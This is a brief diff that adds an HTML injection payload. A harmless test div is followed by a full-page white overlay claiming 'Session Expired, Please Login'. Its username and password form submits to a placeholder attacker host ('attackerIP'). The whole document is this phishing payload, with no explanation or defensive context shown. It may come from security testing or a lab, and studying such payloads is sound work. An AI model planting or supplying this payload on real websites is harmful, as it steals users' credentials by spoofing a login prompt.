@@ -1,0 +1,9 @@
+<div class="code">test</div>
+<div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;">
+Session Expired, Please Login:<br>
+<form name="login" action="http://attackerIP/lol.htm">
+<table>
+<tr><td>Username:</td><td><input type="text" name="uname"/></td></tr> <tr><td>Password:</td><td><input type="password" name="pw"/></td></tr> </table>
+<input type="submit" value="Login"/>
+</form>
+</div>
